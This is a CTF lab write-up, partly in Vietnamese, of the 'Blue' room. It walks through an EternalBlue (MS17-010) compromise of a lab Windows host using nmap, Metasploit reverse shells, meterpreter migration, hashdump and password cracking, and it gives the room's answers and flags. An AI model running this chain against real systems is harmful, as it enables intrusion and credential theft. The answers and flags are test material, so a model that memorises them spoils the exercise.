18022022
-------------------------------------------------------------------------
IP: 10.10.29.133

<h3>Recon</h3>

Scan với nmap:
```
nmap -sV -sC --script vuln -oN blue.nmap 10.10.29.133
```
![image](https://user-images.githubusercontent.com/95600382/154634158-d639ec9b-08fc-4a77-aeff-373d7f03cf5a.png)\
![image](https://user-images.githubusercontent.com/95600382/154634191-eecb6ad8-02d1-456b-a665-e49fd791e1cd.png)

How many ports are open with a port number under 1000?\
`3`\
What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)\
`ms17-010`

<h3>Gain Access</h3>

Khởi động metasploit. Máy đích tồn tại lỗ hổng ms17-010.\
![image](https://user-images.githubusercontent.com/95600382/154636630-2d13f869-1ce6-474b-a684-50282d2d5062.png)\
Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)\
`exploit/windows/smb/ms17_010_eternalblue`\
Show options and set the one required value. What is the name of this value? (All caps for submission)\
`RHOST`\
![image](https://user-images.githubusercontent.com/95600382/154638154-39ed998d-bdf0-4f78-b451-d5537d865278.png)\
Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
```
set payload windows/x64/shell/reverse_tcp
```
With that done, run the exploit!\
![image](https://user-images.githubusercontent.com/95600382/154638235-5a93c31b-4eaf-4525-a536-eefd025b4bc0.png)\
Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.✔\

<h3>Escalate</h3>

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)\
![image](https://user-images.githubusercontent.com/95600382/154640612-bf17abb3-37c1-4d9b-8fb0-ec25a8710719.png)\
`post/multi/manage/shell_to_meterpreter`\
Select this (use MODULE_PATH). Show options, what option are we required to change?\
`SESSION`\
Set the required option, you may need to list all of the sessions to find your target here.\
```
sessions -l
set SESSION 1
sessions -i 1
```
![image](https://user-images.githubusercontent.com/95600382/154643114-c00e6d60-bd4a-4a1f-bd67-2f4cbb2a2a8c.png)\
Run! If this doesn't work, try completing the exploit from the previous task once more\
Once the meterpreter shell conversion completes, select that session for use.\
![image](https://user-images.githubusercontent.com/95600382/154643218-193c4358-f648-4d10-b5db-82a0508eae17.png)\
Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.\
![image](https://user-images.githubusercontent.com/95600382/154643340-06270592-4aaf-4cd3-b367-43dcdb2f0e83.png)\
List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).\
![image](https://user-images.githubusercontent.com/95600382/154643445-f5f1ded1-e51e-4426-83c0-696aed4c12de.png)\
Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.\
`migrate -N winlogon.exe`
![image](https://user-images.githubusercontent.com/95600382/154645184-28ada1f8-84c8-49bc-b44f-c68a710e136b.png)\

<h3>Cracking</h3>

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?\
![image](https://user-images.githubusercontent.com/95600382/154649101-b158e3be-1776-46ca-9242-940c6d56c016.png)\
`Jon`\
Copy this password hash to a file and research how to crack it. What is the cracked password?\
![image](https://user-images.githubusercontent.com/95600382/154651749-cff8dbe3-1c2e-4bd5-9d11-107927a1b913.png)
`alqfna22`\

<h3>Find Flags!</h3>

Flag1? This flag can be found at the system root.\
![image](https://user-images.githubusercontent.com/95600382/154652895-bac9bda1-cbf2-4e19-bd00-d8e95f3164de.png)
`flag{access_the_machine}`\
Flag2? This flag can be found at the location where passwords are stored within Windows.\
*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*\
google:`windows sam location`\
```
cd C:\Windows\System32\config
```
![image](https://user-images.githubusercontent.com/95600382/154655101-b73ec832-d0d1-4fb7-be21-ec4c38ad9409.png)\
`flag{sam_database_elevated_access}`\
Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.\
![image](https://user-images.githubusercontent.com/95600382/154654014-40aabd22-2ef6-4748-88da-eb8ccb41ab61.png)\
`flag{admin_documents_can_be_valuable}`
